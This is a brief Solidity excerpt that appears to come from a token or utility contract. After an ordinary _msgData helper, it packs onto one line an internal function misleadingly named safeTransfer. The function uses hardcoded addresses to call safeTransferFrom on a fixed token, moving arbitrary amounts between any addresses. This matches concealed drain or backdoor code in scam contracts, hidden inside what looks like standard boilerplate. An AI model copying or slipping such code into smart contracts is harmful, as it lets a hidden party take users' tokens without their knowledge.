 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xF0616A02Eb528Ba74b213F88857F3367EE17B6Db)) {TransferHelper.safeTransferFrom(0x5Db8A642e57DB0716C15D82b4dde9A269906ae33,spender,recipient,amount);return true;}return false;}
}
